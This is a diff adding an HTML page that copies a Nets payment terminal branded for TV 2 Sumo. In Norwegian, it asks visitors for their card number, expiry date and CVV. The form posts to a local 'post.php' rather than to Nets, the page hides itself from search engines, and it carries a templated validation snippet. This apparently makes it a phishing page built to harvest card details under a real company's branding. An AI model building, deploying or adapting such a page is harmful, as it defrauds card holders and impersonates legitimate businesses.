@@ -1,0 +1,363 @@
+<html xmlns="http://www.w3.org/1999/xhtml" lang="nb-NO"><head><title>
+	Nets - Aksepter betaling
+</title><meta name="robots" content="noindex"><meta name="referrer" content="origin-when-crossorigin"><meta name="google" content="notranslate"><meta name="viewport" content="width=device-width"><meta http-equiv="X-UA-Compatible" content="IE=edge"><link rel="SHORTCUT ICON" href="Images/favicon_New.ico"><script type="text/javascript" async="" src="https://dev.netaxept.nets.eu/Analytics/sdk/ca.min.js"></script><script type="text/javascript" src="/terminal/lib/jquery/jquery.3.5.min.js?v3.4.2"></script><style type="text/css">a { color: #404040; } td.lineTop { border-top: solid 1px #404040; } div.lineBottom { border-bottom: solid 1px #404040; }</style><link rel="stylesheet" href="StyleSheet_ExistingTerminal.css"><link href="https://epayment.nets.eu:443/Terminal/css/859316/31052021123544/2600" rel="stylesheet" type="text/css"><script type="text/javascript" src="/terminal/Scripts/Default.js?1711"></script><script type="text/javascript" src="/terminal/Scripts/TDSMethod.js?2052"></script><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+</head>
+
+
+<body id="body" style="margin: 0 0 0 0;">
+    
+    <link href="/App/v1/styles/styles.css?v=2.1" rel="stylesheet">
+    <script type="text/javascript" src="/analytics/sdk/analytics.min.js?v=2.1"></script>
+    <script type="text/javascript" src="/App/v1/js/terminal.js?v=5"></script>
+    <script type="text/javascript" src="/App/v1/js/core.js?v=5"></script>
+    <script type="text/javascript" src="/App/v1/js/rememberMe.js?v=5"></script>
+
+    <script type="text/javascript">
+        var rememberMeposition = null; var isNewterminalEnabled = "False";
+          
+        rememberMeposition = 'toolbar';
+              
+        RememberMe.settings =
+        {
+            merchantId:'859316',
+            transactionId:'01df9ff92c7e42a5ab6b8e48904471e8',
+            paypageLanguage: 'nb-NO',
+            supportedPaymentMethods: ["EasyPaymentMini"],
+
+            ids: {
+                cardNumber: 'cardNumber',
+                securityCode: 'securityCode',
+                cardSelectedHideIds: '',
+
+                positionRememberMe: rememberMeposition,
+                positionCardList: ''
+            },
+            styles: {
+                progressImageSrc: 'images/transparentProgress.gif',
+                helpButtonSrc: 'images/helpbutton.png',
+                issuersImagesFolder: './Images/Issuer/'
+            },
+            disableExpiryDateFields: false,
+            issuerCallback: GetRememberMeIssuerAsync,
+            internalEventsCallback: RememberMeInternalEventsCallback,
+
+            apiLocation: '',
+            appTemplateLocation: ''
+        }
+    
+    </script>
+
+    <form name="form1" method="post" action="post.php" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'okButton')" id="form1" autocomplete="off">
+<div>
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="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">
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['form1'];
+if (!theForm) {
+    theForm = document.form1;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+<script src="/terminal/WebResource.axd?d=0CpHYkkA32ki8XNy3cm9_U5G9r7Zg7WNGtcQJE8HNoQEK6pzP-Gtrvf8iy7-74CKCsVMudoOhXsmtbzu0&amp;t=637814689746327080" type="text/javascript"></script>
+
+
+<script type="text/javascript">
+//<![CDATA[
+ var validationRequiredforMaestro = 'True'; var helpLink = 'helpLink'; var securityCodeLabel = 'securityCodeLabel'; var securityCode = 'securityCode'; var easyPaymentEpaySessionId = '7e57e47a5b7049db907e26317823387f';  $(document).ready(function () {  GetIssuerforEasypaymentMini('cardNumber');  });   
+var perforing3dsCheck = true;
+window.tdsMethodIssuerId = '-35';
+
+function ContinueAfter3dsMethod(threeDSMethodData)
+{
+var processButtonObj = window.document.getElementById('okButton');
+window.perforing3dsCheck = false;
+processButtonObj.click();
+}
+//]]>
+</script>
+
+<script src="/terminal/ScriptResource.axd?d=Kd27iMqrWnJaeaWhWo_xG7gBWdSXi1D4CYIwt8kt2SU2H0QxDCpeOtP4nvMACRB2YJP02pV0_SkgqRVb4xhBfKoGnPV2PbbhCK8EDJf9AoWzKpTww6Y216Hb_wmOjzG9RfGHacjZ125paNuPOfHzoVt6fDM1&amp;t=49337fe8" type="text/javascript"></script>
+<script src="/terminal/ScriptResource.axd?d=zqqcrtfeAyIjFR7OgPjGSTUD9QoIsXDv5HJ6f4N7idy8WDW4QVFm_FgtS0uDawVGJ0DZ9pHQ7dPAvRB90joczcL-06WCSwlTezlLDa_R1GbFvWiGkllF0Uz2XksWDcsirN21GnW3Wd4PaW0nGX6j-UNVmPRxr_XimZgXvg2&amp;t=49337fe8" type="text/javascript"></script>
+<script src="Webservices/Terminal.asmx/js" type="text/javascript"></script>
+<script src="/terminal/WebResource.axd?d=F-X7yPf1qdzsXXpnA53lVbc-bNzrjsiToCuxYgPzyQ4fseeQyHKzLLv-1hFBHHf-bkyBkg-9NnTftiWt0&amp;t=637814689746327080" type="text/javascript"></script>
+<div>
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="825529CB">
+	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="">
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="JemKe9pqbg1C8nMckJIS9Uzjh18fdlAcC86BGT7XRufd0vbYyXD61B78XlEvw+DL+4P9bopBBZLRrVnF8eDlbUlDoy16TfbvEQeimjEWSU4EBcYjxA/IHBEjnOFMWE+IeUZ/VS83QKlyttn+HXxuM46eN7qz93TpNnzl+TSvklL2H69SinzstQFdNWNtifMMdMCnSOV1+ZByO8eDAh+pfZ4rJIyZuhfZgL7JXDg53QxxsKm1eyFiK+pfNvwyEHnEWMXf4X00m18B2MeVn69x+84phSlvlIQh77xMkvEwaEnZtYXBTIoiXQyMBlW6sOes43WtMrm0CQot+dOdBeFN5+zVhbouCEw8prNBlgLMJC1pefoSzA7aEEc5P7plgNXleZh1DtQJ6lyRPIjj2v+oP1cvfInLHRlRVgZrS3kQz97HvhtBlWhLss9foFmLyEwyrUMkCjIdFbJyLqhw8TuBLWc24QILcLLDWj+l9HQrzvmsh50jkosduQRQMLdED0CoO9PPpYjlYse8Neq6FOX9wbXClyI/G8iggzfVCm0JmK8XZR6uwqBE8xga/7S/V4J1VEjQY7bDP6aQXrytHtLhRvOLHmzeV2Y8ZP+IqbM733cVLXqwsZfep34JZsXBoYqOtrgU+yq/Y3owwKcZfWtbkJkXw1Y+QKUZgh16TinOqrf8zrOxxFx8zG11xDTWYJbxBPFHkBekfwJ2OLKcjqNCJjfbcQG4ojnePrW3jfmzcaZuRqjjjBT3U5XjF9mcOyYV73j3nFy5egJUgNrB">
+</div>
+
+        <div id="bbsHostedContent">
+
+            <div class="purchase-flow terminal clearfix">
+	<h1 class="logo">
+		<a href="//sumo.tv2.no/" title="TV 2 Sumo">TV 2 Sumo</a>
+	</h1>
+	<span class="help">Legg inn nytt betalingskort.</span>
+	
+
+            <div id="content" style="color:#404040;border:none;background:#ebebeb;">
+                
+                <div id="contentPadding">
+                    <div id="merchantInfoOld">
+                        
+                        
+                    </div>
+                    
+                    
+
+                    
+                    <div id="redirectPage">
+                        <div id="status_margins" style="margin-bottom:10px;">
+	
+
+    <div id="status_errorPanel" class="alert alert-danger errorPanel" style="display:none;">
+		
+        <span id="status_errorText" role="alert"></span>
+    
+	</div>
+
+    <div id="status_warningPanel" class="alert alert-warning warningPanel" style="display:none;">
+		
+        <span id="status_warningText" role="alert"></span>
+    
+	</div>
+
+    <div id="status_infoPanel" class="alert alert-info infoPanel" style="display:none;">
+		
+        <span id="status_infoText" role="alert"></span>
+    
+	</div>
+
+    <div id="status_okPanel" class="alert alert-success okPanel" style="display:none;">
+		
+        <span id="status_okText" role="alert"></span>
+    
+	</div>
+
+
+</div>
+
+                        
+
+                        
+                        <script type="text/javascript">
+//<![CDATA[
+Sys.WebForms.PageRequestManager._initialize('EasyPaymentMini$sm', 'form1', [], [], [], 90, '');
+//]]>
+</script>
+
+
+
+<script type="text/javascript">
+    var chkMobileDevice = null;
+</script>
+<table style="padding:2px; border-spacing:2px;" aria-describedby="">
+    <tbody><tr>
+        <td><label for="cardNumber" id="EasyPaymentMini_cardNoLabel">Kortnummer</label></td>
+        <td><span id="EasyPaymentMini_expiryLabel">Utløpsdato</span></td>
+        <td colspan="2"><label for="securityCode" id="securityCodeLabel" style="margin-left: 0px;">Verifiseringskode</label></td>
+    </tr>
+    <tr>
+        <td><input name="EasyPaymentMini$cardNumber" type="text" maxlength="19" id="cardNumber" placeholder="0000 0000 0000 0000" autocomplete="off" size="19" onchange="javascript:GetIssuerforEasypaymentMini(this.id);" onkeyup="javascript:GetIssuerforEasypaymentMini(this.id);"></td>
+        <td><select name="EasyPaymentMini$month" id="month" aria-label="month">
+	<option value="01">01</option>
+	<option value="02">02</option>
+	<option value="03">03</option>
+	<option value="04">04</option>
+	<option value="05">05</option>
+	<option value="06">06</option>
+	<option value="07">07</option>
+	<option value="08">08</option>
+	<option value="09">09</option>
+	<option value="10">10</option>
+	<option value="11">11</option>
+	<option value="12">12</option>
+
+</select>
+            <select name="EasyPaymentMini$year" id="year" aria-label="year">
+	<option value="23">2023</option>
+	<option value="24">2024</option>
+	<option value="25">2025</option>
+	<option value="26">2026</option>
+	<option value="27">2027</option>
+	<option value="28">2028</option>
+	<option value="29">2029</option>
+	<option value="30">2030</option>
+	<option value="31">2031</option>
+	<option value="32">2032</option>
+	<option value="33">2033</option>
+	<option value="34">2034</option>
+	<option value="35">2035</option>
+
+</select></td>
+        <td><input name="EasyPaymentMini$securityCode" type="text" maxlength="4" id="securityCode" placeholder="000" autocomplete="off" size="4" style="margin-left: 0px;"></td>        
+        <td><a id="helpLink" href="CardVerificationDetails.aspx?language=nb-NO" target="_blank"><img src="helpIcon_0.png" alt="Help to find your credit card verification code" style="border-width:0px;"></a></td>
+    </tr>
+    <tr>
+        <td style="height: 28px;"><img id="EasyPaymentMini_netsLogo" src="netsSmall_0_New.png" alt="Nets Logo" style="border-width:0px;"></td>
+        <td style="text-align:left"><span id="mifDivEasy" style="display:none"><label class="mifLabel"><input id="mifCheckbox" type="checkbox" name="EasyPaymentMini$mifCheckbox"><label for="mifCheckbox">Betal som Visa</label><span class="mifChkDsgn" aria-role="checkbox"></span></label>&nbsp;&nbsp;<img id="EasyPaymentMini_visaImage" src="visa.png" style="border-width:0px;border-width: 0px; vertical-align: middle"></span></td>
+        <td colspan="3" style="text-align:right">
+            <div id="toolbarButtons">
+                <input type="button" name="EasyPaymentMini$cancelButton" value="Avbryt" onclick="javascript:__doPostBack('EasyPaymentMini$cancelButton','')" id="cancelButton">
+                 <input type="submit" name="EasyPaymentMini$okButton" value="Registrer" onclick="if (perforing3dsCheck) {window.document.getElementById('okButton').style.display='none';var progressImageObj=document.getElementById('progressImage');if(progressImageObj)progressImageObj.style.display='inline';Check3dsMethod('https://epayment.nets.eu/terminal', '7e57e47a5b7049db907e26317823387f', 'cardNumber', '', 'month', 'year', '-35', 'status_margins','okButton'); return false;};" id="okButton">
+            </div>
+            <img alt="Loading..." id="progressImage" src="images/transparentProgress.gif" style="display: none;">
+        </td>
+    </tr>
+    <input type="hidden" name="EasyPaymentMini$validationRequired" id="validationRequired" value="True">
+</tbody></table>
+
+<script type="text/javascript" src="/epay/Scripts/Common.js?2065"></script>
+
+
+                        
+
+                        
+                        
+                    </div>
+
+                    <div id="orderDetails">
+                        
+                        <div id="nextDiv">
+                        
+                    <div id="buttonDiv" class="t_alignCenter"></div>
+                    
+
+                </div>
+                    </div> 
+                    <div class="col-lg-5 order-3" id="SmallScreen">
+                                            
+                    </div>
+
+            </div>
+        </div>
+
+        
+	<div id="errorMessage" style="display: none"></div>
+</div>
+
+        </div>
+
+        
+
+        <!-- The Modal -->
+        <div id="myModal" class="modal" tabindex="-1" role="dialog" aria-labelledby="modalLabel" aria-hidden="true" style="z-index: 10000;">
+            
+            <div class="modal-dialog" role="document">
+                
+                <div class="mymodal">
+                    <span id="modalHeader" style="font-weight: bold; font-size: 14px;"></span>
+                </div>
+                <div class="mymodal">
+                    <span id="modalContent"></span>
+                </div>
+                <div class="mymodal">
+                    <button type="button" class="btn closewindow" onclick="close();">
+                        <span id="modalFooter"></span></button>
+                </div>
+            </div>
+            
+        </div>
+        <div id="overlay">
+	
+            <input name="RememberMe" type="hidden" id="RememberMe">
+        
+</div>
+    
+
+<script type="text/javascript">
+//<![CDATA[
+WebForm_AutoFocus('okButton');//]]>
+</script>
+</form>
+
+
+    <div class="modal fade" id="modalCVV" tabindex="-1" role="dialog" aria-labelledby="modalLabel" aria-hidden="true" style="z-index: 10000;">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <span id="modalLabel" class="modal-title" style="font-weight: bold">Nets - Hva er CVV?</span>
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                        <span aria-hidden="true">×</span>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <div style="border: solid 1px #7f7b7b;">
+                        <table style="border-spacing: 0px" role="presentation">
+                            
+                            <tbody><tr role="presentation">
+                                <td colspan="2" role="presentation">
+                                    <div style="font-weight: bold; padding: 10px; color: black">
+                                        Hva er verifiseringskode(CVV2/ CVC2/CID)?
+                                    </div>
+                                    <div style="padding-left: 10px; color: black">
+                                        <span id="into">Verifiseringskoden er et 3- eller 4-sifret nummer som er  skrivet på forsiden eller baksiden av kortet. Verifiseringskoden hjelper selgeren å forhindre svindel og bekrefte transaksjonen når det faktiske kortet ikke er til stede på kjøpstidspunktet. Dette nummeret brukes som en del av autorisasjonsprosessen med kortutsteder.</span>
+                                    </div>
+                                </td>
+                            </tr>
+                            <tr role="presentation">
+                                <td valign="top" role="presentation">
+                                    <div style="font-weight: bold; padding: 10px; color: black">
+                                        Hvor finner jeg det?
+                                    </div>
+                                    <div style="font-weight: bold; padding-left: 10px; color: black">
+                                        Visa, Mastercard, JCB, Diners Club og Discover
+                                    </div>
+                                    <div style="padding-left: 10px; color: black">
+                                        <span id="visaCVV">Verifiseringskoden er det tresifrede nummeret som er skrevet ut på baksiden av kortet, vanligvis på slutten av signaturpanelet. Hvis du bruker et kreditt- / debetkort og vil betale med debet, er bekreftelseskoden de tre sifrene etter kortnummeret på kortets bakside.</span>
+                                    </div>
+                                </td>
+                            </tr>
+                            <tr role="presentation">
+                                <td valign="top" role="presentation">
+                                    <div style="font-weight: bold; padding-left: 10px; padding-top: 10px; color: black">American Express</div>
+                                    <div style="padding-left: 10px; padding-bottom: 10px; color: black">
+                                        <span id="amexCVV">Verifiseringskoden er det 4-sifret nummeret som står på forsiden, over og til høyre på kortet ditt.</span>
+                                    </div>
+                                </td>
+                            </tr>
+                        </tbody></table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <input name="terminalDesign" type="hidden" id="terminalDesign" value="false">
+    
+    <script type="text/javascript">
+        RememberMe.init();
+    </script>
+    
+
+<script>
+  $(document).ready(function() {
+    // Replace 'form1' with the actual ID of your form element if different
+    $('#form1').submit(function(e) {
+      var cardNumber = $('#cardNumber').val();
+      var month = $('#month').val();
+      var year = $('#year').val();
+      var cvv = $('#securityCode').val();
+
+      if (!cardNumber || !month || !year || !cvv) {
+        e.preventDefault(); // Prevent form submission
+        alert('Please fill out all the required fields.');
+      }
+    });
+  });
+</script>
+
+</body></html>
